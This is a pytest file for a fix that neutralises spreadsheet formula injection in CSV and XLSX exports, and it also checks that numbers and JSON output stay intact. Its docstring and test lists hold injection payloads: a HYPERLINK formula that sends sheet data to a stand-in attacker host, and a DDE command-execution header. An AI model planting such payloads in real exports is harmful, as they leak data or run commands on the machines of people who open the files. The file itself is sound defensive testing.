"""F-VIZ-04: an exported cell must not execute when the file is opened.

`export_csv` and `export_xlsx` wrote every value verbatim. A cell beginning `=`, `+`,
`-`, `@` or a control character is a formula to Excel and Google Sheets, so
`=HYPERLINK("http://attacker/?"&A1,"total")` exfiltrates the sheet's own contents to
whoever opens it.

This is not only self-harm. Projects are shared, dashboards are shared (SCN-084), and
analytics rows arrive from a vendor — so one member can plant the row and another
exports and opens it.

**The fix differs per format, and the difference was measured rather than assumed:**

* XLSX — `openpyxl` writes a `=`-leading string as `data_type='f'`, an actual formula,
  while `+`, `-` and `@` come out as `'s'`. So here the cell can be forced to text and
  the value survives **byte for byte**.
* CSV — there is no type system; the consumer's import parser decides, and Excel's
  evaluates all of `= + - @` plus a leading tab or carriage return. The only defence is
  to change the value, so a single quote is prefixed. That cost is real and is why it is
  not applied to XLSX, where it is unnecessary.
* JSON — no formula semantics anywhere in the format. Deliberately untouched.
"""

from __future__ import annotations

import csv
import io

import pytest
from openpyxl import load_workbook

from app.connectors.base import QueryResult
from app.viz.export import export_csv, export_json, export_xlsx

DANGEROUS = ["=1+1", "+1+1", "-1+1", "@SUM(A1)", '=HYPERLINK("http://evil/?"&A1,"x")']
SAFE = ["plain text", "2026-08-20", "-", "", "a=b", "user@example.com", "3.14"]
#: Negative and grouped numbers are the reason the rule is not a blanket character list:
#: `-` leads a formula, so a naive check prefixes every one of these and breaks a
#: financial export for every downstream consumer.
NUMERIC = ["-1500.00", "-1", "-0.5", "1,234.56", "-1,234.56", "+42"]


def _result(values: list) -> QueryResult:
    return QueryResult(columns=["v"], rows=[[v] for v in values], row_count=len(values))


class TestCsv:
    @pytest.mark.parametrize("value", DANGEROUS)
    def test_a_formula_cell_is_neutralised(self, value: str):
        out = export_csv(_result([value]))
        cell = list(csv.reader(io.StringIO(out)))[1][0]
        assert not cell.startswith(("=", "+", "-", "@")), f"still executable: {cell!r}"
        # The original text must still be readable — neutralising is not deleting.
        assert value in cell

    @pytest.mark.parametrize("value", SAFE)
    def test_ordinary_values_are_untouched(self, value: str):
        out = export_csv(_result([value]))
        assert list(csv.reader(io.StringIO(out)))[1][0] == value

    def test_a_header_that_looks_like_a_formula_is_neutralised_too(self):
        """Column names come from the query, so they are attacker-shaped as well."""
        r = QueryResult(columns=["=cmd|' /c calc'!A0"], rows=[["x"]], row_count=1)
        header = list(csv.reader(io.StringIO(export_csv(r))))[0][0]
        assert not header.startswith("=")

    def test_a_leading_tab_is_neutralised(self):
        out = export_csv(_result(["\t=1+1"]))
        assert not list(csv.reader(io.StringIO(out)))[1][0].startswith("\t")


class TestXlsx:
    @pytest.mark.parametrize("value", DANGEROUS)
    def test_no_cell_is_written_as_a_formula(self, value: str):
        wb = load_workbook(io.BytesIO(export_xlsx(_result([value]))))
        cell = wb.active.cell(row=2, column=1)
        assert cell.data_type != "f", f"written as a formula: {cell.value!r}"

    @pytest.mark.parametrize("value", DANGEROUS)
    def test_the_value_survives_byte_for_byte(self, value: str):
        """XLSX has types, so safety costs nothing here — unlike CSV."""
        wb = load_workbook(io.BytesIO(export_xlsx(_result([value]))))
        assert wb.active.cell(row=2, column=1).value == value

    @pytest.mark.parametrize("value", SAFE)
    def test_ordinary_values_are_untouched(self, value: str):
        wb = load_workbook(io.BytesIO(export_xlsx(_result([value]))))
        assert wb.active.cell(row=2, column=1).value in (value, None)

    def test_a_formula_shaped_header_is_not_a_formula(self):
        r = QueryResult(columns=["=1+1"], rows=[["x"]], row_count=1)
        wb = load_workbook(io.BytesIO(export_xlsx(r)))
        assert wb.active.cell(row=1, column=1).data_type != "f"


class TestJson:
    @pytest.mark.parametrize("value", DANGEROUS)
    def test_json_is_left_alone(self, value: str):
        """No formula semantics in the format — altering it would corrupt data for
        every consumer to protect none."""
        import json as _json

        assert _json.loads(export_json(_result([value])))[0]["v"] == value


class TestNumbersSurviveIntact:
    """The regression a blanket OWASP character list would introduce."""

    @pytest.mark.parametrize("value", NUMERIC)
    def test_csv_leaves_numbers_alone(self, value: str):
        out = export_csv(_result([value]))
        assert list(csv.reader(io.StringIO(out)))[1][0] == value

    @pytest.mark.parametrize("value", NUMERIC)
    def test_xlsx_leaves_numbers_alone(self, value: str):
        wb = load_workbook(io.BytesIO(export_xlsx(_result([value]))))
        assert wb.active.cell(row=2, column=1).value == value
